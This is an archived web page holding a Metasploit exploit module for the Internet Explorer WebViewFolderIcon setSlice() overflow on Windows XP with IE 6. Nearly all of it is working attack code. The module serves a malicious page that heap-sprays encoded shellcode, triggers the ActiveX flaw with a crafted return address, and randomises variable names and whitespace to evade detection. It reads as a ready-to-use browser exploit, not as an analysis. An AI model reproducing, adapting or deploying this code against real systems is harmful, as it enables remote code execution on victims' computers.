<html><head><title>MS Internet Explorer WebViewFolderIcon setSlice() Overflow Exploit</title></head><pre># This module is part of the metasploit framework3 
# svn co http://metasploit.com/svn/framework3/trunk/

require 'msf/core'

module Msf

class Exploits::Windows::Browser::WebView_SetSlice &lt; Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::Html

	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'Internet Explorer WebViewFolderIcon setSlice() Overflow',
			'Description'    =&gt; %q{
				This module exploits a flaw in the WebViewFolderIcon ActiveX control
			included with Windows 2000, Windows XP, and Windows 2003. This flaw was published
			during the Month of Browser Bugs project (MoBB #18).
			},
			'License'        =&gt; MSF_LICENSE,
			'Author'         =&gt; 
				[ 
					'hdm', 
				],
			'Version'        =&gt; '$Revision: 3783 $',
			'References'     =&gt; 
				[
					[ 'OSVDB', '27110' ],
					[ 'BID', '19030' ],
					[ 'URL', 'http://browserfun.blogspot.com/2006/07/mobb-18-webviewfoldericon-setslice.html' ]
				],
			'Payload'        =&gt;
				{
					'Space'          =&gt; 1024,
					'BadChars'       =&gt; &quot;\x00&quot;,
	
				},
			'Platform'       =&gt; 'win',
			'Targets'        =&gt;
				[
					['Windows XP SP0-SP2 / IE 6.0SP1 English', {'Ret' =&gt; 0x0c0c0c0c} ]
				],
			'DefaultTarget'  =&gt; 0))
	end

	def autofilter
		false
	end
	
	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Get a unicode friendly version of the return address
		addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]

		# Randomize the javascript variable names	
		var_buffer    = Rex::Text.rand_text_alpha(rand(30)+2)
		var_shellcode = Rex::Text.rand_text_alpha(rand(30)+2)
		var_unescape  = Rex::Text.rand_text_alpha(rand(30)+2)
		var_x         = Rex::Text.rand_text_alpha(rand(30)+2)
		var_i         = Rex::Text.rand_text_alpha(rand(30)+2)
		var_tic       = Rex::Text.rand_text_alpha(rand(30)+2)
		var_toc       = Rex::Text.rand_text_alpha(rand(30)+2)
		
		# Randomize HTML data
		html          = Rex::Text.rand_text_alpha(rand(30)+2)
		
		# Build out the message
		content = %Q|
&lt;html&gt;
&lt;head&gt;
	&lt;script&gt;
	try {
	
	var #{var_unescape}  = unescape ;
	var #{var_shellcode} = #{var_unescape}( &quot;#{shellcode}&quot; ) ;
	
	var #{var_buffer} = #{var_unescape}( &quot;%u#{addr_word}&quot; ) ;
	while (#{var_buffer}.length &lt;= 0x400000) #{var_buffer}+=#{var_buffer} ;

	var #{var_x} = new Array() ;	
	for ( var #{var_i} =0 ; #{var_i} &lt; 30 ; #{var_i}++ ) {
		#{var_x}[ #{var_i} ] = 
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} +
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} + 
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} + 		
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;
	}
	
	
   	for ( var #{var_i} = 0 ; #{var_i} &lt; 1024 ; #{var_i}++) {
		var #{var_tic} = new ActiveXObject( 'WebViewFolderIcon.WebViewFolderIcon.1' );	
		try { #{var_tic}.setSlice( 0x7ffffffe , 0 , 0 , #{target.ret} ) ; } catch( e ) { }
		var #{var_toc} = new ActiveXObject( 'WebViewFolderIcon.WebViewFolderIcon.1' );
	}
	
	} catch( e ) { window.location = 'about:blank' ; }
	
	&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
#{html}
&lt;/body&gt;
&lt;/html&gt;		
		|

		# Randomize the whitespace in the document
		content.gsub!(/\s+/) do |s|
			len = rand(100)+2
			set = &quot;\x09\x20\x0d\x0a&quot;
			buf = ''
			
			while (buf.length &lt; len)
				buf &lt;&lt; set[rand(set.length)].chr
			end
			
			buf
		end
		
		print_status(&quot;Sending exploit to #{cli.peerhost}:#{cli.peerport}...&quot;)

		# Transmit the response to the client
		send_response(cli, content)
	end

end

end

# milw0rm.com [2006-09-27]</pre></html>